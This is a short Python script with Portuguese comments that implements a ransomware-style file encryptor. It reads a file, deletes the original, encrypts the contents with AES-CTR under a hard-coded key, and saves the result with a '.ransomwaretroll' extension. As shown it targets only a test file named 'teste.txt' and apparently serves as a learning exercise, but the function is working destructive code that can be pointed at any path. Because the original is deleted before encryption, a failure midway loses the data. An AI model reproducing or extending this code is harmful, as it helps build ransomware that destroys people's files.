import os
import pyaes

def encrypt_file(file_name, key):
    """
    Encripta um arquivo usando a chave fornecida.

    Args:
        file_name (str): Nome do arquivo a ser encriptado.
        key (bytes): Chave de encriptação.

    Returns:
        None
    """
    try:
        # Abrir o arquivo a ser encriptado
        with open(file_name, "rb") as file:
            file_data = file.read()

        # Remover o arquivo
        os.remove(file_name)

        # Criar um objeto AES
        aes = pyaes.AESModeOfOperationCTR(key)

        # Encriptar o arquivo
        crypto_data = aes.encrypt(file_data)

        # Salvar o arquivo encriptado
        new_file = file_name + ".ransomwaretroll"
        with open(new_file, "wb") as new_file:
            new_file.write(crypto_data)

        print(f"Arquivo {file_name} encriptado com sucesso!")

    except FileNotFoundError:
        print(f"Arquivo {file_name} não encontrado.")
    except Exception as e:
        print(f"Erro ao encriptar arquivo: {e}")

if __name__ == "__main__":
    file_name = "teste.txt"
    key = b"testeransomwares"
    encrypt_file(file_name, key)